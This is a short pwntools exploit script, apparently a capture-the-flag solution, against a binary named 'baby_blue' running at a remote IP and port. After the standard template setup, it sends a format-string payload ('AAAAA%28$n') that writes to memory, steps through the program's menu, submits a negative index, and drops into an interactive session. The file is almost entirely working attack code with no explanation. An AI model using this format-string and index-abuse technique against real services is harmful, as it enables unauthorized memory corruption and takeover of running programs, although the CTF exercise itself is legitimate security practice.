#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './baby_blue')

host = args.HOST or '34.65.87.36'
port = int(args.PORT or 8083)

if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('libc.so.6')
else:
    libc = ELF('libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *admin_panel
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

pay1 = b"AAAAA%28$n"
io.sendlineafter(b"> ", b"1")
io.recv()
io.sendline(pay1)
io.recv()

io.sendline(b"2")
io.recv()
io.sendline(pay1)
io.recv()

io.sendline(b"3")

io.recv()

io.sendline(b"4")

io.recv()

io.sendline(b"-10")

io.interactive()

